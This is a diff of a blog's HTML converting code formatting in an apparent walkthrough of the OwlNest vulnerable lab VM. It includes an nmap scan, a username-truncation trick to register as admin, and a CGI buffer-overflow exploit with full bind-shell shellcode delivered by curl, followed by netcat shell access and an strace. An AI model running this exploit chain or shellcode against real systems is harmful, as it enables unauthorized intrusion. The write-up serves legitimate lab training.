@@ -86,64 +86,115 @@
 
 <p>A quick dig around using NMAP</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:/var/www# nmap -sS -O -p1-65535 &ndash;script banner 172.16.56.131 -P0</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:/var/www# nmap -sS -O -p1-65535 --script banner 172.16.56.131 -P0
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-01 22:49 BST
+</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.131
+</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">65530</span> closed ports
+</span><span class='line'>PORT      STATE SERVICE
+</span><span class='line'>22/tcp    open  ssh
+</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+</span><span class='line'>80/tcp    open  http
+</span><span class='line'>111/tcp   open  rpcbind
+</span><span class='line'>31337/tcp open  Elite
+</span><span class='line'><span class="p">|</span> banner: <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span><span class="se">\x</span>0D<span class="se">\x</span>
+</span><span class='line'><span class="p">|</span>_0A        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\\</span>...
+</span><span class='line'>34895/tcp open  unknown
+</span><span class='line'>MAC Address: 00:0C:29:9A:51:B8 <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 3.2 - 3.10
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>
+</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 8.87 seconds
+</span><span class='line'>root@pwk:/var/www#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-01 22:49 BST
-Nmap scan report for 172.16.56.131
-Host is up (0.00034s latency).
-Not shown: 65530 closed ports
-PORT      STATE SERVICE
-22/tcp    open  ssh
-|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
-80/tcp    open  http
-111/tcp   open  rpcbind
-31337/tcp open  Elite
-| banner: (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)\x0D\x
-|</em>0A        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\&hellip;
-34895/tcp open  unknown
-MAC Address: 00:0C:29:9A:51:B8 (VMware)
-Device type: general purpose
-Running: Linux 3.X
-OS CPE: cpe:/o:linux:linux_kernel:3
-OS details: Linux 3.2 - 3.10
-Network Distance: 1 hop</p>
-
-<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
-root@pwk:/var/www#
-[/plain]</p>
 
 <p>Looks like there&rsquo;s a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:/var/www# nc -nv 172.16.56.131 31337
-nc: 172.16.56.131 31337 open
-        (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)
-        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
-        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
-       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
-       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
-   &mdash;&ndash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;
-        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:/var/www# nc -nv 172.16.56.131 31337
+</span><span class='line'>nc: 172.16.56.131 <span class="m">31337</span> open
+</span><span class='line'>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
+</span><span class='line'>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
+</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
+</span><span class='line'>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
+</span><span class='line'>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
+</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'>
+</span><span class='line'>This is the OwlNest Administration console
+</span><span class='line'>
+</span><span class='line'>Type Help <span class="k">for</span> a list of available commands.
+</span><span class='line'>
+</span><span class='line'>Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
+</span><span class='line'>Ready: <span class="nb">help</span>
+</span><span class='line'>
+</span><span class='line'>Syntax: <span class="nb">command</span> &lt;argument&gt;
+</span><span class='line'>
+</span><span class='line'><span class="nb">help      </span>This <span class="nb">help</span>
+</span><span class='line'>username   Specify your login name
+</span><span class='line'>password   Specify your password
+</span><span class='line'>privs  Specify your access level
+</span><span class='line'>login      login to shell with specified username and password
+</span><span class='line'>
+</span><span class='line'>Ready:
+</span></code></pre></td></tr></table></div></figure>
 
-<p>This is the OwlNest Administration console</p>
-
-<p>Type Help for a list of available commands.</p>
-
-<p>Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
-Ready: help</p>
-
-<p>Syntax: command <argument></p>
-
-<p>help         This help
-username     Specify your login name
-password     Specify your password
-privs    Specify your access level
-login        login to shell with specified username and password</p>
-
-<p>Ready:
-[/plain]</p>
 
 <p>This looks like something we&rsquo;ll need a username and password for. As none are known, this port is being ignored for now. Port 80&rsquo;s where it&rsquo;s at then.</p>
 
@@ -157,17 +208,20 @@ login        login to shell with specified username and password</p>
 
 <p>Looking at the source for the registration page, it seems the username is capped at 16 characters.</p>
 
-<p>[html]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;form-group&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>              <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">&quot;nome&quot;</span> <span class="na">class=</span><span class="s">&quot;col-sm-2 col-lg-2 control-label&quot;</span><span class="nt">&gt;</span>Login Name:<span class="nt">&lt;/label&gt;</span>
+</span><span class='line'>              <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;col-sm-5 col-lg-5&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>                  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">class=</span><span class="s">&quot;form-control&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;16&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span> <span class="na">id=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Choose a Login name...&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>              <span class="nt">&lt;/div&gt;</span>
+</span><span class='line'>          <span class="nt">&lt;/div&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<div class="form-group">
-                <label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
-                <div class="col-sm-5 col-lg-5">
-                    <input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
-                </div>
-            </div>
-
-
-<p>[/html]</p>
 
 <p>Could we cheat the system and register a user with the name &ldquo;admin&rdquo; and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of &ldquo;admin&rdquo; and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to &ldquo;admin           a&rdquo; and submitted.</p>
 
@@ -191,9 +245,10 @@ login        login to shell with specified username and password</p>
 
 <p>The upload form posts to /application/upload</p>
 
-<p>[html]
-<form class="form-horizontal" method="POST" enctype="multipart/form-data" action="/application/upload">
-[/html]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">&quot;form-horizontal&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span> <span class="na">enctype=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">action=</span><span class="s">&quot;/application/upload&quot;</span><span class="nt">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Which when called with no arguments shows the following</p>
 
@@ -211,277 +266,500 @@ login        login to shell with specified username and password</p>
 
 <p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6d;&#x65;&#64;&#109;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#109;&#x65;&#x40;&#x6d;&#x65;&#x2e;&#x63;&#111;&#x6d;</a>&rdquo;
-root@pwk:~# ./owlbin
-Content-type: text/plain</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">export </span><span class="nv">QUERY_STRING</span><span class="o">=</span><span class="s2">&quot;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=me@me.com&quot;</span>
+</span><span class='line'>root@pwk:~# ./owlbin
+</span><span class='line'>Content-type: text/plain
+</span><span class='line'>
+</span><span class='line'>Unable to open file
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Unable to open file
-root@pwk:~#
-[/plain]</p>
 
 <p>It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# export QUERY_STRING=$(python -c &lsquo;print &ldquo;uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@&rdquo; + &ldquo;A&rdquo;*276+&ldquo;BBBB&rdquo;&rsquo;)
-root@pwk:~# ./owlbin
-Content-type: text/plain</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">export </span><span class="nv">QUERY_STRING</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@&quot; + &quot;A&quot;*276+&quot;BBBB&quot;&#39;</span><span class="k">)</span>
+</span><span class='line'>root@pwk:~# ./owlbin
+</span><span class='line'>Content-type: text/plain
+</span><span class='line'>
+</span><span class='line'>Segmentation fault
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Segmentation fault
-root@pwk:~#
-[/plain]</p>
 
 <p>gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we&rsquo;ll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# export QUERY_STRING=$(python -c &lsquo;print &ldquo;uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@&rdquo; + &ldquo;A&rdquo;*276+&ldquo;\xab\x75\x0c\x08&rdquo; + &ldquo;\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&rdquo;&rsquo;)
-root@pwk:~# curl -v &ldquo;<a href="http://172.16.56.140/application/upload">http://172.16.56.140/application/upload</a>&rdquo; &ndash;data &ldquo;$QUERY_STRING&rdquo;
-* About to connect() to 172.16.56.140 port 80 (#0)
-*   Trying 172.16.56.140&hellip;
-* connected
-* Connected to 172.16.56.140 (172.16.56.140) port 80 (#0)</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">export </span><span class="nv">QUERY_STRING</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@&quot; + &quot;A&quot;*276+&quot;\xab\x75\x0c\x08&quot; + &quot;\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&quot;&#39;</span><span class="k">)</span>
+</span><span class='line'>root@pwk:~# curl -v <span class="s2">&quot;http://172.16.56.140/application/upload&quot;</span> --data <span class="s2">&quot;$QUERY_STRING&quot;</span>
+</span><span class='line'>* About to connect<span class="o">()</span> to 172.16.56.140 port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
+</span><span class='line'>*   Trying 172.16.56.140...
+</span><span class='line'>* connected
+</span><span class='line'>* Connected to 172.16.56.140 <span class="o">(</span>172.16.56.140<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
+</span><span class='line'>&gt; POST /application/upload HTTP/1.1
+</span><span class='line'>&gt; User-Agent: curl/7.26.0
+</span><span class='line'>&gt; Host: 172.16.56.140
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt; Content-Length: 436
+</span><span class='line'>&gt; Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>&gt;
+</span><span class='line'>* upload completely sent off: <span class="m">436</span> out of <span class="m">436</span> bytes
+</span><span class='line'>root@pwk:~# nc -nv 172.16.56.140 1337
+</span><span class='line'>nc: 172.16.56.140 <span class="m">1337</span> open
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<blockquote><p>POST /application/upload HTTP/1.1
-User-Agent: curl/7.26.0
-Host: 172.16.56.140
-Accept: <em>/</em>
-Content-Length: 436
-Content-Type: application/x-www-form-urlencoded</p>
-
-<ul>
-<li>upload completely sent off: 436 out of 436 bytes
-root@pwk:~# nc -nv 172.16.56.140 1337
-nc: 172.16.56.140 1337 open
-id
-uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
-[/plain]</li>
-</ul>
-</blockquote>
 
 <p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x72;&#109;&#x70;&#64;&#49;&#x37;&#x32;&#x2e;&#49;&#x36;&#x2e;&#x35;&#54;&#46;&#x31;&#x33;&#x31;">&#114;&#109;&#x70;&#x40;&#x31;&#x37;&#x32;&#x2e;&#49;&#54;&#x2e;&#x35;&#x36;&#46;&#x31;&#x33;&#x31;</a>
-The authenticity of host &lsquo;172.16.56.131 (172.16.56.131)&rsquo; can&rsquo;t be established.
-RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added &lsquo;172.16.56.131&rsquo; (RSA) to the list of known hosts.
-Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh rmp@172.16.56.131
+</span><span class='line'>The authenticity of host <span class="s1">&#39;172.16.56.131 (172.16.56.131)&#39;</span> can<span class="s1">&#39;t be established.</span>
+</span><span class='line'><span class="s1">RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.</span>
+</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
+</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>172.16.56.131<span class="err">&#39;</span> <span class="o">(</span>RSA<span class="o">)</span> to the list of known hosts.
+</span><span class='line'>Linux owlnest 3.2.0-4-686-pae <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 i686</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>You have new mail.
+</span><span class='line'>rmp@owlnest:~<span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
+</span><span class='line'>rmp@owlnest:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
-
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-You have new mail.
-rmp@owlnest:~$ id
-uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
-rmp@owlnest:~$
-[/plain]</p>
 
 <p>There&rsquo;s one application available in /home/rmp, and that&rsquo;s the application that is listening on port 31337 (the one that requested username and password etc).</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-rmp@owlnest:~$ ls -l
-total 588
--rwx&mdash;&mdash; 1 rmp rmp 599275 Aug 11 13:35 adminconsole
-rmp@owlnest:~$
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>rmp@owlnest:~<span class="nv">$ </span>ls -l
+</span><span class='line'>total 588
+</span><span class='line'>-rwx------ <span class="m">1</span> rmp rmp <span class="m">599275</span> Aug <span class="m">11</span> 13:35 adminconsole
+</span><span class='line'>rmp@owlnest:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>which when straced, shows that it is reading /root/password.txt to check the provided credentials.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# strace ./adminconsole
-execve(&ldquo;./adminconsole&rdquo;, [&ldquo;./adminconsole&rdquo;], [/<em> 19 vars </em>/]) = 0
-uname({sys=&ldquo;Linux&rdquo;, node=&ldquo;pwk&rdquo;, &hellip;})   = 0
-brk(0)                                  = 0x9407000
-brk(0x9407cd0)                          = 0x9407cd0
-set_thread_area({entry_number:-1 -> 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
-brk(0x9428cd0)                          = 0x9428cd0
-brk(0x9429000)                          = 0x9429000
-fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775e000
-write(1, &ldquo;        (\<strong><em>/)   (\</em></strong>/)   (\<strong>&rdquo;&hellip;, 67        (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)
-) = 67
-write(1, &ldquo;        /0\ /0\   /o\ /o\   /0\ &rdquo;&hellip;, 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
-) = 67
-write(1, &ldquo;        \</strong>V<strong>/   \</strong>V<strong>/   \</strong>V&rdquo;&hellip;, 67        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
-) = 67
-write(1, &ldquo;       /|:. .:|\ /|;, ,;|\ /|:. &rdquo;&hellip;, 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
-) = 68
-write(1, &ldquo;       &#92;:::::// &#92;;;;;;// &#92;:::&rdquo;&hellip;, 68       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
-) = 68
